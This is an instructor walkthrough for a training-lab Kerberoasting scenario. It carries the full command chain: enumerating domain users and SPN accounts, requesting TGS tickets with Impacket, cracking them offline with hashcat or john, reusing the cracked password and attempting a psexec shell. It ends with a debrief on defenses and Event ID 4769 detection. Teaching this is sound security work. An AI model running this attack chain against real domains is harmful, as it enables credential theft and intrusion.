# Walkthrough — SCEN-002: Credential Access — Kerberoasting

**INSTRUCTOR ONLY — Do not distribute to students**

---

## Phase 1: Domain Enumeration

### Step 1: Verify Domain Credentials
```bash
# From kali-attacker, verify jsmith creds work
crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local
# Expected: [+] lab.local\jsmith:Password123
```

### Step 2: Enumerate Domain Users
```bash
# LDAP enumeration
ldapsearch -H ldap://<dc01_ip> -D "jsmith@lab.local" -w "Password123" \
  -b "DC=lab,DC=local" "(objectClass=user)" sAMAccountName description memberOf

# Or using crackmapexec
crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local --users
```

### Step 3: Find SPN Accounts
```bash
# Using Impacket GetUserSPNs.py — enumeration only (no ticket request)
impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip>
```

Expected output:
```
ServicePrincipalName    Name        MemberOf  PasswordLastSet
----------------------  ----------  --------  -------------------
MSSQLSvc/dc01.lab.local svc_sql               2026-03-31 12:00:00
WBEM/dc01.lab.local     svc_backup            2026-03-31 12:00:00
```

---

## Phase 2: Kerberoasting

### Step 4: Request TGS Tickets
```bash
# Request all TGS tickets and output as hashcat-compatible format
impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip> -request \
  -outputfile kerberoast_hashes.txt
```

### Step 5: Examine the Hashes
```bash
cat kerberoast_hashes.txt
# Each line starts with $krb5tgs$23$ (RC4 encryption)
# Format: $krb5tgs$23$*svc_sql$LAB.LOCAL$...
```

---

## Phase 3: Offline Cracking

### Step 6: Crack with hashcat
```bash
# Mode 13100 = Kerberos 5 TGS-REP (RC4)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Or with john
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

Expected result:
- `svc_sql`: Cracks to `Summer2024!` (should take <5 minutes with rockyou.txt)
- `svc_backup`: Will NOT crack with rockyou.txt (`B4ckup$ecure2024` is not in standard wordlists)

### Step 7: Validate Access
```bash
# Use cracked svc_sql password
crackmapexec smb <dc01_ip> -u svc_sql -p 'Summer2024!' -d lab.local

# Check what shares svc_sql can access
crackmapexec smb <dc01_ip> -u svc_sql -p 'Summer2024!' -d lab.local --shares

# Try to get a shell
impacket-psexec lab.local/svc_sql:'Summer2024!'@<dc01_ip>
```

---

## Phase 4: Advanced

### Step 8: BloodHound (Optional)
```bash
# Collect AD data with bloodhound-python
bloodhound-python -d lab.local -u jsmith -p 'Password123' \
  -ns <dc01_ip> -c all

# Import the JSON files into BloodHound GUI
# Look for: Shortest Path from jsmith to Domain Admins
```

---

## Debrief Discussion Points

1. **Why does Kerberoasting work?** Any authenticated domain user can request a TGS ticket for any SPN. The ticket is encrypted with the service account's password hash (RC4 by default), allowing offline cracking.

2. **What makes an account Kerberoastable?** Having an SPN registered AND using RC4 encryption (default unless AES is enforced). The vulnerability is the weak password, not the SPN itself.

3. **Defenses**:
   - Use Group Managed Service Accounts (gMSA) — 120-char auto-rotating passwords
   - Enforce AES encryption for Kerberos (hardens against cracking but doesn't eliminate it)
   - Service account passwords must be 25+ characters
   - Monitor Event ID 4769 for anomalous TGS requests
   - Use honeypot SPNs (fake service accounts that trigger alerts when TGS is requested)

4. **Detection**: Event ID 4769 with `Ticket Encryption Type: 0x17` (RC4) from unexpected source IPs, especially in bulk. Normal service accounts get TGS requests from their own servers — requests from user workstations are suspicious.

5. **Real-world impact**: Kerberoasting is used in >50% of enterprise AD compromises. It requires only a single valid low-privilege domain credential and produces crackable hashes with no network noise beyond a few Kerberos requests.
